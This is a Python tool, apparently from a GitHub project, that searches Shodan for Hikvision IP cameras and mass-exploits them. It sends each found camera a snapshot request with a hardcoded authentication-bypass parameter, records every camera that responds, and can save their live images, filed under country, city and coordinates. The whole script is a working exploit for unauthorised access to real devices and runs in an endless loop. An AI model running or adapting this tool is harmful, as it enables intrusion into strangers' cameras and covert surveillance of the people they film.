import shodan
import argparse
import requests
from datetime import date
from urllib import request
import time

def download_snapshot_img(url, ip, port, location):
    file_url = url
    file = location + "_" + str(ip) + "-" + str(port) + "_" + str(date.today()) + ".jpg"
    try:
        request.urlretrieve(file_url, file)
        print(f"[+] Snapshot saved: {file}")
    except Exception as e:
        print(f"[!] Error downloading snapshot from {url}: {e}")

def is_vulnerable(url, verbose, ip, port, location):
    payload = "/onvif-http/snapshot?auth=YWRtaW46MTEK"
    try:
        r = requests.get(url + payload, timeout=2)
        status_code = r.status_code
    except requests.exceptions.RequestException as e:
        if verbose:
            print(f"[!] Connection error for {url}: {e}")
        return False
    
    if status_code == 200:
        print(f"[+] Vulnerable! --> {url}{payload} | Location: {location}")
        open('urls.txt', 'a+').write(f"{url}{payload}\n")
        if download_snapshot:
            download_snapshot_img(url + payload, ip, port, location)
        return True
    else:
        if verbose:
            print(f"[!] Not vulnerable: {url}")
        return False

def scan(token, dork, verbose, download_snapshot):
    api = shodan.Shodan(token)
    
    for i in range(1, 500):  # Перебираем страницы с результатами
        try:
            results = api.search(dork, page=i)
            for result in results['matches']:
                location = result['location']
                location_str = f"{location['country_name']}_{location['city']}_{location['latitude']}_{location['longitude']}"
                ip = result['ip_str']
                port = result['port']
                url = f"http://{ip}:{port}"
                if verbose:
                    print(f"[!] Testing {url}")
                is_vulnerable(url, verbose, ip, port, location_str)
        except shodan.APIError as e:
            print(f"[!] Shodan API error: {e}")
            break  # Останавливаем сканирование в случае ошибки API
        
        # Добавляем паузу, чтобы избежать блокировки
        time.sleep(1)

def banner():
    print('  _     _ _           _     _             _____ _   _ ')
    print(' | |   (_) |         (_)   (_)           |_   _| \\ | |')
    print(' | |__  _| | ____   ___ ___ _  ___  _ __   | | |  \\| |')
    print(" | '_ \\| | |/ /\\ \\ / / / __| |/ _ \\| '_ \\  | | | . ` |")
    print(' | | | | |   <  \\ V /| \\__ \\ | (_) | | | |_| |_| |\\  |')
    print(" |_| |_|_|_|\\_\\  \\_/ |_|___/_|\\___/|_| |_|_____|_| \\_|\n")
    print("--------->https://github.com/diego-tella<------------")

if __name__ == "__main__":
    banner()
    parser = argparse.ArgumentParser(description='Scanner and exploit for Hikvision Cameras')
    parser.add_argument('-d', '--dork', help='Custom dork for the scan', type=str)
    parser.add_argument('-s', '--savefile', action='store_true', help='Save snapshots from vulnerable cams')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose mode')
    parser.add_argument('-api', '--apitoken', type=str, help='Shodan API token', required=True)
    args = parser.parse_args()

    token = args.apitoken
    dork = args.dork if args.dork else 'Product:"Hikvision IP Camera"'
    verbose = args.verbose
    download_snapshot = args.savefile

    print(f"[+] Verbose: {'on' if verbose else 'off'}")
    print(f"[+] Download snapshot: {'on' if download_snapshot else 'off'}")
    print(f"[+] Dork used: {dork}")

    # Начинаем сканирование
    while True:
        try:
            scan(token, dork, verbose, download_snapshot)
        except Exception as e:
            print(f"\n[!] Unexpected error: {e}\n")
            time.sleep(5)  # Пауза перед повторной попыткой

